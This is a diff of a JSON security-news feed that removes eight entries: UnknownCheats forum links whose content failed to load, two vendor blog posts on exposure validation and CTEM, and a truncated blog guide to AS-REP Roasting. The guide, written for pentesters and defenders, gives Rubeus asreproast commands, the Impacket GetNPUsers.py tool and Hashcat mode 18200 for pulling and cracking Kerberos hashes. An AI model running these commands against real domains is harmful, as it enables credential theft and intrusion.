@@ -1,214 +1,20 @@
 {
   "schema_version": 1,
-  "date": "2026-08-04",
-  "generated_at": "2026-08-03T22:15:50.952126+00:00",
-  "item_count": 8,
-  "kinds_included": [
-    "publish"
-  ],
-  "items": [
-    {
-      "id": "a:1b9b48d180763724",
-      "kind": "publish",
-      "text": "unknowncheats-ac published: https://www.unknowncheats.me/forum/general-programming-and-reversing/748063-easyanticheat-sys-kernel-driver-re-rust-post4760154.html",
-      "actor": "unknowncheats-ac",
-      "actor_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/",
-      "created_at": "2026-08-03T22:12:48.983315+00:00",
-      "html_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/748063-easyanticheat-sys-kernel-driver-re-rust.html",
-      "title": "https://www.unknowncheats.me/forum/general-programming-and-reversing/748063-easyanticheat-sys-kernel-driver-re-rust-post4760154.html",
-      "via": "browser_llm",
-      "collect_mode": "browser_llm",
-      "content": "",
-      "content_format": "text/plain",
-      "content_status": "failed",
-      "content_via": "",
-      "content_source_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/748063-easyanticheat-sys-kernel-driver-re-rust.html",
-      "content_chars": 0,
-      "content_sha256": "",
-      "content_fetched_at": "2026-08-03T22:13:37.488531+00:00",
-      "content_error": "browser:RuntimeError:cf_challenge_unresolved status=403",
-      "time_precision": "daily_window",
-      "source_name": "UnknownCheats Anti-Cheat",
-      "fetch_status": "ok",
-      "url_corrected": true
-    },
-    {
-      "id": "a:bffdf197aff89dc5",
-      "kind": "publish",
-      "text": "unknowncheats-ac published: NtLdr - WindowsNT Injector",
-      "actor": "unknowncheats-ac",
-      "actor_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/",
-      "created_at": "2026-08-03T22:12:48.983315+00:00",
-      "html_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/735809-ntldr-windowsnt-injector.html",
-      "title": "NtLdr - WindowsNT Injector",
-      "via": "browser_llm",
-      "collect_mode": "browser_llm",
-      "content": "",
-      "content_format": "text/plain",
-      "content_status": "failed",
-      "content_via": "",
-      "content_source_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/735809-ntldr-windowsnt-injector.html",
-      "content_chars": 0,
-      "content_sha256": "",
-      "content_fetched_at": "2026-08-03T22:13:48.369757+00:00",
-      "content_error": "browser:RuntimeError:cf_challenge_unresolved status=403",
-      "time_precision": "daily_window",
-      "source_name": "UnknownCheats Anti-Cheat",
-      "fetch_status": "ok",
-      "url_corrected": false
-    },
-    {
-      "id": "a:973cfcec318dd421",
-      "kind": "publish",
-      "text": "unknowncheats-ac published: https://www.unknowncheats.me/forum/general-programming-and-reversing/763834-multiplatform-achievement-unlocker-post4759954.html",
-      "actor": "unknowncheats-ac",
-      "actor_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/",
-      "created_at": "2026-08-03T22:12:48.983315+00:00",
-      "html_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/763834-multiplatform-achievement-unlocker.html",
-      "title": "https://www.unknowncheats.me/forum/general-programming-and-reversing/763834-multiplatform-achievement-unlocker-post4759954.html",
-      "via": "browser_llm",
-      "collect_mode": "browser_llm",
-      "content": "",
-      "content_format": "text/plain",
-      "content_status": "failed",
-      "content_via": "",
-      "content_source_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/763834-multiplatform-achievement-unlocker.html",
-      "content_chars": 0,
-      "content_sha256": "",
-      "content_fetched_at": "2026-08-03T22:13:59.255736+00:00",
-      "content_error": "browser:RuntimeError:cf_challenge_unresolved status=403",
-      "time_precision": "daily_window",
-      "source_name": "UnknownCheats Anti-Cheat",
-      "fetch_status": "ok",
-      "url_corrected": true
-    },
-    {
-      "id": "a:0aaaa2450e2b8bb8",
-      "kind": "publish",
-      "text": "safebreach-blog published: Thought LeadershipAug 3 , 2026CTEM Has a Silent E—and It Stands for EvidenceRead More",
-      "actor": "safebreach-blog",
-      "actor_url": "https://www.safebreach.com/blog/",
-      "created_at": "2026-08-03T22:12:48.983315+00:00",
-      "html_url": "https://www.safebreach.com/blog/ctem-evidence-regulatory-compliance-validation/",
-      "title": "Thought LeadershipAug 3 , 2026CTEM Has a Silent E—and It Stands for EvidenceRead More",
-      "via": "browser_llm",
-      "collect_mode": "browser_llm",
-      "content": "Aug 3, 2026\nCTEM Has a Silent E—and It Stands for Evidence\nRegulators worldwide are done accepting attestation and now demand evidence. Learn what CISOs need to prove their controls actually work—and how to build the habit now.\nSummary\nRegulators worldwide—DORA, NIS2, the SEC, NYDFS, PCI DSS 4.0, and the EU AI Act—are shifting from attestation (‘we have controls’) to evidence (‘we can prove they work’). For CISOs, that means Continuous Threat Exposure Management (CTEM) only satisfies auditors and boards when its validation stage produces timestamped, reproducible proof of what was tested, what fired, and what got fixed. Hear SafeBreach cybersecurity expert Adrian Culley break down why organizations that build the evidence habit early will lead the way.\nAuthor:\nAdrian Culley, Offensive Security Expert & Senior Sales Engineer\nI want to begin with a spelling correction, which is not something I ever expected to make in a security article. We have all spent years talking about\nContinuous Threat Exposure Management\n(CTEM), Gartner’s five-stage framework. C-T-E-M. And I have come to believe we have been spelling it wrong the whole time.\nCTEM has a silent E on the end. It is really CTEME, and the silent E stands for Evidence. It is, I would argue, the only silent letter in the English language that regulators can hear perfectly well.\nLet me be clear about what I am and am not saying. Gartner’s CTEM is still five stages—scoping, discovery, prioritization, validation, and mobilization—and I am not rewriting the framework. My point is narrower and, I think, more urgent: the whole cycle only means something if it ends in evidence. Scoping, discovery, prioritization—these produce plans and lists. Validation is where something different happens. If validation ends with a dashboard someone glances at, you have performed an exercise. If it ends with a timestamped, reproducible record of what was tested, what fired, what didn’t, and what you fixed, you have produced evidence. And evidence is rapidly becoming the currency of cyber regulation worldwide.\nThe End of the Attestation Era\nThere was nothing wrong with the old model—ten years ago. That was the era of attestation. You attested that you had a firewall, endpoint protection, an annual penetration test, and everyone around the table nodded. The trouble is that attestation answers the question “do you have controls?”—and the question regulators are now asking is “do your controls work?”\nThose are completely different questions, and our industry has spent two decades answering the first, while breaches kept demonstrating that the second was going unanswered. Read almost any major breach post-mortem and you will find the same paragraph: the victim had a SIEM, had an EDR, had a program that looked mature on paper. The controls existed. They simply didn’t do their job on the day.\nMeanwhile the discovery side of the house has become almost too good. Scanners, cloud posture tools, attack surface management—most enterprises can generate ten thousand findings before lunch. Which is precisely why I keep saying that exposure data without validation is just a longer to-do list. The discovery machinery is superb now. What it cannot tell you is whether any of it matters against a real adversary, because that requires actually behaving like one. Execute the technique. Take T1003.001—credential dumping from LSASS memory. Did the EDR block it? Did the SIEM rule fire? Did the SOC see it inside their target window? Once you have run it, you don’t merely know the answer. You can prove you know it. That is the whole distinction.\nFollow the Receipts\nThe claim that regulators worldwide are converging on evidence is a large one, so let me walk through the receipts.\nStart with DORA, the EU’s\nDigital Operational Resilience Act\n—Regulation 2022/2554, applying to financial entities since January 2025. DORA does not ask banks to attest to resilience. Chapter four mandates a digital operational resilience testing program, and for designated significant entities, Article 26 requires threat-led penetration testing at least every three years, against live production systems, with findings and remediation plans going back to the authorities. That is an evidence pipeline written into law. The mechanics come from\nTIBER-EU\n, the European Central Bank’s threat-led testing framework, whose entire design is that the test mimics real threat actors based on real intelligence and produces a documented result a supervisor can inspect. That is evidence with a threat model attached.\nThen look at\nNIS2\n—Directive 2022/2555, which broadened all of this well beyond finance to essential and important entities across eighteen sectors. Article 21 lists the mandatory risk-management measures, and buried in that list is my favorite clause in modern cyber regulation: entities must have policies and procedures to\nassess the effectiveness\nof their cybersecurity risk-management measures. Not “have measures”—assess whether the measures work. That is the silent E written into a European directive. And NIS2 pairs it with Article 20, which places accountability on management bodies personally. Board members’ questions changed overnight: no longer “do we have a security program?” but “can someone show me the evidence that it works, because my name is on it?”\nCross the Channel and the UK is plainly not sitting this out. The Cyber Security and Resilience Bill is working its way through Parliament, and UK financial services have arguably been ahead of everyone—the FCA and PRA operational resilience regime requires firms to set impact tolerances and\nevidence\n, through scenario testing, that they can stay within them, holding a written self-assessment the regulator can demand at any time. The deadline to demonstrate that passed in March 2025, and new operational incident reporting duties now run the evidence demand in both directions: prove in advance that you are resilient, and document in detail when you weren’t.\nCross the Atlantic, and you’ll see this is not just a European habit. The\nSEC’s cybersecurity disclosure rules\n, in force since December 2023, require public companies to disclose material incidents on Form 8-K, Item 1.05, within four business days, and to describe annually, under Regulation S-K Item 106, how they assess and manage cyber risk. If your 10-K says you validate your defences and an incident later shows you never did, that is not embarrassment—that is potential securities liability. New York has gone further still: NYDFS Part 500, as amended in November 2023, requires an annual certification of material compliance, signed by the CISO and the highest-ranking executive. No rational CISO signs that on vibes. You sign it because you hold test results, validation records, and documented remediation. And the payments world worked this out years ago—\nPCI DSS 4.0\n, Requirement 11, insists you demonstrate controls operate continuously, because a point-in-time audit only tells you about one Tuesday. The newest arrival, the EU AI Act, bites for high-risk systems on August 2, 2026, with Article 12 mandating automatic logging and Article 11 mandating technical documentation. A different domain, an identical philosophy: the regulator does not want your assurance, the regulator wants your records.\nRegulations Requiring Evidence, Not Attestation\nRegulation\nJurisdiction\nEvidence requirement\nStatus\nDORA (Reg 2022/2554)\nEU financial entities\nArticle 26: threat-led penetration testing at least every 3 years for significant entities, against live systems\nIn force since Jan 2025\nNIS2 (Directive 2022/2555)\nEU, 18 essential/important sectors\nArticle 21: must assess effectiveness of risk measures, not just have them; Article 20 puts personal accountability on management\nTransposing across member states\nUK operational resilience (FCA/PRA)\n+\nCyber Security and Resilience Bill\nUK financial services & beyond\nMust evidence, via scenario testing, that impact tolerances hold; written self-assessment on demand\nSelf-assessment deadline passed March 2025; bill in Parliament\nSEC cybersecurity disclosure rules\nUS public companies\nForm 8-K Item 1.05 (4-day incident disclosure); Reg S-K Item 106 (annual risk-management description)\nIn force since Dec 2023\nNYDFS\nPart 500\nNY-regulated financial entities\nAnnual certification of material compliance, signed by CISO and top executive\nAmended Nov 2023\nPCI DSS 4.0\nGlobal payments\nRequirement 11: demonstrate controls operate continuously, not just at audit time\nCurrent\nEU AI Act\nEU, high-risk AI systems\nArticle 12 automatic logging; Article 11 technical documentation\nEnforcement Aug 2, 2026 (EC has proposed pushing some deadlines to 2027—not yet law)\nPaperwork is Not Evidence\nAt this point a fair objection arrives: “we already produce mountains of compliance paperwork—surely that is evidence?” It is not, and the difference is what generated it. Compliance paperwork is largely self-description—humans writing down what they believe the environment does. Evidence, in the sense the silent E means it, is machine-generated ground truth: an attack technique executed at a given timestamp, against a given control, with an exact record of what happened.\nIt has three properties paperwork lacks. It is\nempirical\n—produced by execution, not opinion. It is\nreproducible\n—run the same technique next quarter and compare. And it is\nspecific\n—mapped to something real, like a MITRE ATT&CK technique ID, rather than a vague control objective. A policy document ages the moment it is printed. Evidence carries a timestamp and invites you to refresh it.\nOne Dataset, Two Audiences\nThis is where the economics change, and where I would ask executives to pay close attention. Boards have historically filed security validation under technical hygiene. What I am describing is validation as regulatory work-product: the same execution evidence that tunes a detection rule on Monday answers a supervisor’s effectiveness question on Friday. One dataset, two audiences. It lets the CISO sign the NYDFS certification, lets the board discharge its NIS2 duty, backs the 10-K language, feeds the DORA testing file—and, incidentally, satisfies the cyber insurer, who is asking the same effectiveness questions the regulators are, only with premiums attached instead of fines.\nThis is what we do at\nSafeBreach\n:\nadversarial exposure validation (AEV)\n. And the pattern I see under DORA and NIS2 is consistent: validation reports have stopped being an internal SOC artifact and started going upstairs. Once you see that evidence as a reusable asset rather than a report that dies in a shared drive, you are no longer paying for a test. You are building a continuously refreshed body of proof that half a dozen stakeholders already demand.\nWhat to Look For\nIf you accept the silent E and want to build the evidence habit, here is what separates genuine capability from a marketing label. Look for\nreal execution\n—the approach must run the technique against live controls, not map assets to a threat feed and infer, because inference is not evidence. Look for\nframework alignment\n, with results tied to\nMITRE ATT&CK IDs\n, so the evidence speaks a language auditors, regulators and red teams share. Look for\nreproducibility and trend\n—can you run the same scenario quarterly and show the delta? Regulators love a trend line; it proves the programme is alive. Look for\nexportability\n, because evidence locked inside a tool is evidence you cannot hand to a supervisor. And add a governance test of your own: chain of custody in the loose sense—who ran the test, when, against what scope, with what result and what remediation. If the evidence cannot answer those questions, a regulator will treat it the way a court treats hearsay. A brilliant penetration test with a PDF nobody can reconcile to scope six months later is craft without evidence. The discipline matters as much as the execution.\nThe Direction of Travel\nIs the silent E a European fashion, or the permanent direction of travel? Permanent and accelerating. DORA in force, NIS2 transposing across member states, the UK bill in Parliament, the SEC regime maturing through enforcement, NYDFS certifications cycling annually, the AI Act’s logging obligations arriving in weeks—every new instrument, in every jurisdiction, moves the same way: from attestation to demonstration.\nMy prediction is straightforward. Within a couple of years, “show me your validation evidence” will be as routine an opening question in a supervisory review as “show me your asset inventory” is today. The organizations that built the evidence habit early will find those conversations short and boring—which is exactly what you want a regulatory conversation to be.\nSo, spell it however you like. Just make sure the last letter of your exposure management program is proof, not a promise.\nTo see how the\nSafeBreach CTEM Platform\nis helping some of the world’s largest enterprise security teams operationalize CTEM, validate real-world risk, and drive continuous, measurable risk reduction,\nrequest a customized demo\ntoday.\nAbout the Author\nAdrian Culley\nis Head of Engineering, EMEA for SafeBreach. He has over 35 years of Computer Security experience, particularly specialising in Security Operations, Artificial Intelligence, Offensive Security, Threat Intelligence and Malware: in short Cyber Resilience. He is a core member of the OWASP Large Language Model Top Ten risks working Group.\nHe is a graduate of the Information Security Group at Royal Holloway, University of London, and an occasional visiting lecturer there. Adrian was previously a Detective with Scotland Yard, working around the world with their Special Operations Directorate, and latterly served with the Computer Crime Unit there. He has also worked directly for the UK Central Government in a global role. He worked for Palo Alto Networks for 5 years as a Consulting Engineer and Head of Industry 4.0. Previously he has also worked for PWC, Trellix, Cybereason, Guidance Software, AccessData and Damballa. Adrian has a strong background in Digital Forensics and has worked with Government, NGO, military, intelligence, law enforcement, and commercial clients around the world.\nFrequently Asked Questions\nCTEM Evidence & Regulatory Validation\nWhat is CTEM evidence, and how is it different from compliance attestation?\nAttestation is a self-description—a written claim that a control exists. Evidence is machine-generated ground truth: an attack technique executed at a specific timestamp against a specific control, with a documented record of what happened. CTEM’s validation stage is only doing its job if it produces the latter.\nWhich regulations now require security control validation evidence, not just a written policy?\nDORA (Article 26) mandates threat-led penetration testing against live systems for significant EU financial entities. NIS2 (Article 21) requires entities to assess the effectiveness of their risk measures, not just have them. The SEC requires public companies to disclose material incidents within four business days and describe their risk management annually. NYDFS Part 500 requires an annual certification signed by the CISO and a top executive. PCI DSS 4.0 (Requirement 11) requires proof that controls operate continuously. And the EU AI Act (Articles 11 and 12) mandates technical documentation and automatic logging for high-risk systems.\nHow does adversarial exposure validation (AEV) generate regulatory evidence?\nAEV executes real adversary techniques—mapped to MITRE ATT&CK IDs—against live production controls and records exactly what happened: whether the control blocked it, whether the SIEM alerted, whether the SOC caught it in time. That output is empirical, reproducible, and specific, which is precisely what regulators are asking for when they say “prove your controls work.”\nDoes DORA require penetration testing, or is a security questionnaire enough?\nA questionnaire won’t satisfy DORA. Article 26 requires designated significant entities to undergo threat-led penetration testing at least every three years, against live production systems, following the TIBER-EU methodology—with findings and remediation plans reported back to the authorities. It’s a testing mandate, not a self-assessment.\nYou Might Also Be Interested In\nBlog\nThe Four Critical Operational Characteristics of an Effective CTEM Program\nRead More\nBlog\nDoes Your CTEM Program Have an AI Blind Spot?\nRead More\nWebinars\nTake Command of Risk: Operationalizing CTEM with SafeBreach Helm\nRead More\nGet the latest\nresearch and news",
-      "content_format": "text/plain",
-      "content_status": "ok",
-      "content_via": "browser",
-      "content_source_url": "https://www.safebreach.com/blog/ctem-evidence-regulatory-compliance-validation/",
-      "content_chars": 16589,
-      "content_sha256": "eda6d9253a152c6b022fc7d962bee8c14816d0f93da6e265676b3b4ead3d206c",
-      "content_fetched_at": "2026-08-03T22:14:50.888144+00:00",
-      "content_error": "",
-      "time_precision": "daily_window",
-      "source_name": "SafeBreach Blog",
-      "fetch_status": "ok",
-      "url_corrected": false
-    },
-    {
-      "id": "a:cf89b1d3159d3991",
-      "kind": "publish",
-      "text": "cymulate-blog published: How Bitsight + Cymulate Turn Threat Intelligence into Validated ResilienceRead More",
-      "actor": "cymulate-blog",
-      "actor_url": "https://cymulate.com/blog/",
-      "created_at": "2026-08-03T22:12:48.983315+00:00",
-      "html_url": "https://cymulate.com/blog/bitsight-cymulate-threat-intelligence-validation/",
-      "title": "How Bitsight + Cymulate Turn Threat Intelligence into Validated ResilienceRead More",
-      "via": "llm",
-      "collect_mode": "html_llm",
-      "content": "How Bitsight + Cymulate Turn Threat Intelligence into Validated Resilience\nBy:\nAvigayil Stein\nAugust 3, 2026\nSecurity teams rely on threat intelligence to understand the adversaries, campaigns and vulnerabilities that matter most. But intelligence alone doesn't prove whether security controls can stop those threats.\nThe Bitsight and Cymulate integration bridges that gap. By combining Bitsight Threat Intelligence with Cymulate Exposure Validation, organizations can prioritize the threats most relevant to their environment, validate security controls against real-world adversary behavior and continuously improve cyber resilience.\nWhy Bitsight Threat Intelligence needs continuous validation\nSecurity teams often have threat intelligence, exposure data and validation results, but these workflows are usually disconnected.\nCyber threat intelligence (CTI) teams may identify the adversaries and campaigns most relevant to the organization, but that intelligence does not always translate into action. SOC and detection engineering teams still need to determine whether existing controls can detect or prevent relevant adversary behavior. Security validation teams need to know which scenarios to prioritize. Security leaders need evidence that investments are improving readiness against real threats.\nThis creates manual work across the security workflow:\nTranslating adversary intelligence into validation scenarios\nMapping TTPs and IoCs to executable tests\nInterpreting prevention and detection results separately from threat context\nPrioritizing remediation based on assumptions instead of validated exposure\nProving whether security improvements reduced risk against relevant threats\nThis matters now because adversary activity changes quickly, threat intelligence volume continues to grow and security teams have limited resources. The teams that can connect intelligence to validation can focus on the threats that matter most and prove whether defenses are improving over time.\nHow the Cymulate + Bitsight integration works\nThe integration creates a two-way workflow between adversary intelligence and exposure validation.\nBitsight brings context on relevant adversaries, campaigns, TTPs, IoCs, infrastructure, targeting patterns and CVEs. Cymulate Vero AI maps that context to executable validation scenarios and findings, helping teams validate whether security controls can prevent or detect the techniques and indicators associated with relevant ransomware groups, APTs, malware families and campaigns.\nThe workflow helps teams move from intelligence to action:\n1. Bitsight identifies relevant adversaries, TTPs, IoCs and CVEs.\n2. Cymulate highlights relevant MITRE techniques through targeted threat intel.\n3. Cymulate Vero AI connects those techniques to relevant scenarios and findings.\n4. Teams validate prevention and detection coverage.\n5. Cymulate provides remediation guidance, automated mitigation options and retesting.\n6. Validation results can flow back into Bitsight, enriching adversary, TTP and CVE views with evidence of whether relevant techniques and indicators are prevented or detected in the customer environment.\nMany threat intelligence integrations stop at importing indicators or enriching dashboards. Cymulate and Bitsight go further by turning adversary intelligence into validation activity and connecting validation results back to the intelligence workflow.\nIn practice, Bitsight-prioritized techniques appear directly in Cymulate through the MITRE heatmap and targeted threat intel, so teams can move from intelligence into validation, remediation guidance and retesting.\nBenefits of the Bitsight and Cymulate integration\nWith Bitsight and Cymulate, security teams can move from broad threat awareness to evidence-based action.\nPrioritized validation:\nFocus testing on the adversaries, techniques, IoCs and CVEs most relevant to the organization.\nEvidence-based control assurance:\nProve whether security controls prevent or detect real-world adversary behavior.\nFaster remediation:\nUse Cymulate remediation guidance, automated mitigation and retesting to close validated gaps.\nMore actionable CTI:\nConnect threat intelligence to validation outcomes instead of leaving it as static context.\nStronger reporting:\nShow progress with evidence of improved resilience against relevant threats.\nThe result is a clearer path from threat awareness to measurable improvements in cybersecurity.\nTurn threat intelligence into validated security\nThreat intelligence tells teams what to care about. Exposure validation proves whether the organization is prepared.\nBy integrating Bitsight adversary intelligence with Cymulate continuous exposure validation, security teams can understand which threats are relevant, whether controls are working, which gaps require action and whether remediation improved protection.\nInstead of moving from intelligence to assumptions, teams can move from intelligence to proof.\nThat is how organizations turn real-world adversary behavior into stronger defenses.\nAlready a Cymulate customer?\nIf you are using Bitsight Threat Intelligence, you can use the Cymulate Platform to prioritize validation based on relevant adversary intelligence and validate whether your controls prevent or detect the threats that matter most to your organization. Contact your account manager for guidance on enabling the integration, supported workflows and best practices for your environment.\nEvaluating Cymulate or Bitsight?\nRequest a demo\nto see how Cymulate and Bitsight help your team prioritize validation based on relevant adversary intelligence, prove whether controls are working and close the gaps that matter most.\nAvigayil Stein\nAvigayil is a Product Marketing Manager at Cymulate. With a background in marketing B2B SaaS products, she aspires to spread the word about the benefits of a proactive and continuous cybersecurity program.\nMore about Author\nTable of Contents\nWhy Bitsight Threat Intelligence needs continuous validation\nHow the Cymulate + Bitsight integration works\nBenefits of the Bitsight and Cymulate integration\nTurn threat intelligence into validated security\nAlready a Cymulate customer?\nEvaluating Cymulate or Bitsight?\nCymulate Exposure Validation\nmakes advanced security testing fast and easy. When it comes to building custom attack chains, it's all right in front of you in one place.\nMike Humbert\n,\nCybersecurity Engineer\nDARLING INGREDIENTS INC.\nLearn More\nFeatured Resources\nView More Resources\nSolution Brief\nBitsight + Cymulate\nPrioritize threats, validate security controls and strengthen cyber resilience with Bitsight and Cymulate.\nRead More\nData Sheet\nCymulate Exposure Validation\nProve security readiness with AI-powered exposure validation that continuously tests threats and strengthens defenses.\nRead More\nblog\nMITRE ATT&CK v19 Unpacked: What Changed and How to Operationalize\nSee how MITRE ATT&CK is evolving beyond detection with two new tactics focused on resilience and response.\nRead More\nGET A PERSONALIZED DEMO\nReady to see Cymulate in action?\nBook a Demo",
-      "content_format": "text/plain",
-      "content_status": "ok",
-      "content_via": "http",
-      "content_source_url": "https://cymulate.com/blog/bitsight-cymulate-threat-intelligence-validation/",
-      "content_chars": 7056,
-      "content_sha256": "c999dd9b365da1782cd4ff5afea5ecbf342a5e757b8bb1693990ba68b27d4957",
-      "content_fetched_at": "2026-08-03T22:15:32.254275+00:00",
-      "content_error": "",
-      "time_precision": "daily_window",
-      "source_name": "Cymulate Blog",
-      "fetch_status": "ok",
-      "url_corrected": false
-    },
-    {
-      "id": "a:911c43c2301315d7",
-      "kind": "publish",
-      "text": "denizhalil-blogs published: What is AS-REP Roasting Exploitation: A Comprehensive Guide",
-      "actor": "denizhalil-blogs",
-      "actor_url": "https://denizhalil.com/blogs/",
-      "created_at": "2026-08-03T05:35:00+00:00",
-      "html_url": "https://denizhalil.com/2026/08/03/as-rep-roasting-attack-guide/",
-      "title": "What is AS-REP Roasting Exploitation: A Comprehensive Guide",
-      "via": "rss",
-      "collect_mode": "rss",
-      "content": "Introduction\nAS-REP Roasting is a critical attack technique that exploits a fundamental misconfiguration in Kerberos authentication, particularly within Active Directory environments. This sophisticated attack specifically targets user accounts where Kerberos pre-authentication has been disabled, allowing attackers to extract and crack user password hashes offline without triggering account lockouts or generating significant security alerts. In modern enterprise networks, Active Directory serves as the cornerstone of identity and access management, with Kerberos functioning as the default authentication protocol for Windows environments since Windows 2000.The security of these environments heavily depends on the proper configuration of Kerberos pre-authentication, a security feature designed to prevent unauthorized users from obtaining encrypted credential material without first proving their identity. The pre-authentication mechanism requires users to encrypt a timestamp with their password hash before the Key Distribution Center (KDC) will process authentication requests. When this critical security control is disabled—often for legacy application compatibility or due to administrative oversight—it creates a significant vulnerability that attackers can exploit with minimal technical sophistication. This simple yet effective control prevents attackers from blindly requesting Ticket Granting Tickets (TGTs) and obtaining encrypted material suitable for offline password cracking.\nThe consequences of successful AS-REP Roasting attacks extend far beyond simple credential compromise. Once attackers crack these passwords offline using GPU-accelerated tools, they gain legitimate access to Active Directory resources, enabling lateral movement, privilege escalation, and potentially complete domain compromise. The attack’s stealthy nature makes it particularly dangerous: the offline cracking phase generates no network traffic, avoids account lockout mechanisms, and leaves minimal forensic evidence on domain controllers. Understanding both the technical mechanics of AS-REP Roasting and implementing comprehensive preventive security practices is essential for modern cybersecurity professionals, penetration testers, security operations center (SOC) analysts, and system administrators responsible for protecting Active Directory infrastructure.\nLearning Objectives\nBy reading this article, you will:\nUnderstand the fundamentals of Kerberos protocol and the pre-authentication mechanism\nLearn how AS-REP Roasting attacks operate and the risks they pose\nBecome familiar with popular tools and techniques used to execute this attack\nUnderstand detection and mitigation strategies\nGrasp the key differences between AS-REP Roasting and Kerberoasting\nWhat Is AS-REP Roasting Attack?\nAS-REP Roasting is a credential access technique that targets user accounts in Active Directory where the “Do not require Kerberos pre-authentication” attribute is enabled. This attack exploits a critical security weakness in the Kerberos authentication protocol’s initial authentication exchange. In a properly configured Kerberos environment with pre-authentication enabled, users must first prove their identity by encrypting a timestamp with their password-derived key before the Key Distribution Center (KDC) issues a Ticket Granting Ticket (TGT). This mechanism serves as a critical defense against offline password attacks by ensuring that only users who know the correct password can initiate the authentication process.However, when the pre-authentication requirement is disabled—typically to support legacy applications or systems that don’t support modern Kerberos features—attackers can send an AS-REQ (Authentication Server Request) message for any targeted user account without providing any credentials whatsoever. The Domain Controller, following the account’s configuration, responds with an AS-REP (Authentication Server Response) message containing encrypted data. This response includes a session key and other authentication material encrypted with a key derived from the user’s password hash, typically using RC4-HMAC encryption (encryption type 0x17). The attacker can capture this AS-REP response and extract the encrypted portion, which now contains everything needed for an offline brute-force attack. Unlike online password attacks that generate failed authentication logs and can trigger account lockouts, this offline approach allows unlimited password attempts without any risk of detection or account disruption.\nOnce the AS-REP hash is extracted, attackers leverage GPU-accelerated password cracking tools such as Hashcat or John the Ripper to perform dictionary attacks, rule-based attacks, or brute-force attacks against the captured hash. If the account uses a weak or commonly used password, recovery can occur within seconds to minutes. Even moderately complex passwords may fall within hours or days when subjected to modern cracking rigs equipped with high-performance graphics cards. The cracked password grants the attacker legitimate credentials for the compromised account, enabling them to authenticate to domain resources, move laterally across the network, escalate privileges, and potentially establish persistent access to the environment.\nThis technique exhibits several characteristics that make it particularly attractive to attackers and challenging to defend against:\nTargets high-value accounts:\nAS-REP Roasting typically affects service accounts, machine accounts, and legacy application accounts that often possess elevated privileges or access to sensitive systems and data.\nPassword complexity determines success rate:\nThe time required for successful password recovery is directly proportional to password strength. Accounts with weak passwords (8-12 characters, dictionary words, or common patterns) can be compromised almost instantly, while stronger passwords (15+ characters with high entropy) may resist cracking for extended periods.\nExtremely difficult to detect during exploitation:\nThe offline nature of the password cracking phase makes this attack nearly invisible to security monitoring solutions. While the initial AS-REQ requests generate Event ID 4768 logs, these appear as normal authentication attempts. The actual password cracking occurs on attacker-controlled infrastructure, completely outside the visibility of domain controllers, SIEM platforms, and network monitoring tools.\nHow AS-REP Roasting Works\nAS-REP Roasting follows a systematic, multi-phase attack methodology that exploits the absence of Kerberos pre-authentication. Understanding each stage of this attack chain is crucial for both offensive security practitioners conducting authorized penetration tests and defensive teams implementing detection and mitigation strategies. The attack progresses through five distinct phases, each building upon the previous step to ultimately compromise user credentials and establish unauthorized access to Active Directory resources. The sophistication of AS-REP Roasting lies not in technical complexity, but in its ability to exploit a simple misconfiguration while remaining largely invisible to traditional security monitoring systems. Unlike attacks that generate obvious indicators of compromise, AS-REP Roasting disguises malicious activity within the normal flow of Kerberos authentication traffic. This stealth characteristic, combined with the offline nature of password cracking, makes it one of the most effective credential access techniques in the modern threat landscape.\nThe entire attack can be executed with minimal privileges—in many cases requiring no authentication whatsoever—making it accessible to attackers at the initial reconnaissance stage of an intrusion. Once successful, the compromised credentials provide legitimate access to the domain, allowing attackers to blend seamlessly with normal user activity while conducting further reconnaissance, lateral movement, and privilege escalation operations. Let’s examine each phase of the AS-REP Roasting attack lifecycle in detail:\nPhase 1: Discovery and Account Identification:\nThe attack begins with reconnaissance to identify Active Directory accounts with Kerberos pre-authentication disabled. Attackers use PowerShell commands with Active Directory modules, the PowerView framework’s\nGet-DomainUser -PreauthNotRequired\ncommand, or LDAP queries from Linux environments to filter for accounts where the userAccountControl attribute includes the DONT_REQ_PREAUTH flag. In many environments, these LDAP queries can be performed anonymously without authentication, allowing external attackers to identify vulnerable accounts during the initial reconnaissance phase.\nPhase 2: Sending AS-REQ Messages:\nOnce vulnerable accounts are identified, the attacker sends Authentication Server Request (AS-REQ) messages to the domain controller for each target account. Because pre-authentication is disabled, these requests contain no credentials or proof of identity—just a request for a Ticket Granting Ticket (TGT) for the specified username. Tools like Rubeus on Windows and GetNPUsers.py from Impacket on Linux automate this process, allowing rapid AS-REP requests for multiple accounts.\nPhase 3: Receiving AS-REP Responses:\nWhen the domain controller receives an AS-REQ for an account with pre-authentication disabled, it responds with an AS-REP message without verifying the requester’s identity. This response contains encrypted authentication material encrypted with a key derived from the user’s password, typically using RC4-HMAC encryption (encryption type 0x17), which is approximately 800 times faster to crack than AES-256. The attacker extracts this encrypted blob and formats it for offline password cracking tools.\nPhase 4: Offline Hash Cracking:\nWith the AS-REP hash extracted, the attacker performs offline password cracking on their own infrastructure using GPU-accelerated tools like Hashcat (mode 18200). Modern GPU cracking rigs can test billions of password candidates per hour. Attackers start with dictionary attacks, followed by rule-based attacks, and finally brute-force if necessary. Success depends entirely on password strength—weak passwords fall within seconds, moderate passwords within hours to days.\nPhase 5: Credential Usage and Lateral Movement:\nOnce the password is cracked, the attacker possesses valid domain credentials. These credentials enable legitimate authentication to domain resources and can be used for lateral movement, privilege escalation, data exfiltration, persistence establishment, and further credential harvesting. When the vulnerable accounts are service accounts with elevated privileges, the cracked credentials often provide the foothold needed to progress toward complete domain compromise.\nTools and Techniques to Perform an AS-REP Roasting Attack\nWindows-Based Tools\nRubeus\nis the primary C# toolkit for AS-REP Roasting on Windows systems. This tool automatically identifies and enumerates all domain accounts with pre-authentication disabled, then retrieves their AS-REP hashes\nRubeus.exe asreproast /format:hashcat /outfile:hashes.txt\nRubeus.exe\nasreproast\n/format:hashcat\n/outfile:hashes.txt\nThe basic command queries the entire domain and extracts hashes in Hashcat format. Rubeus supports multiple advanced options for operational security and targeted enumeration:\n# Specify target user\nRubeus.exe asreproast /user:targetuser /domain:domain.local /dc:192.168.1.1\n# Use Kerberos encryption 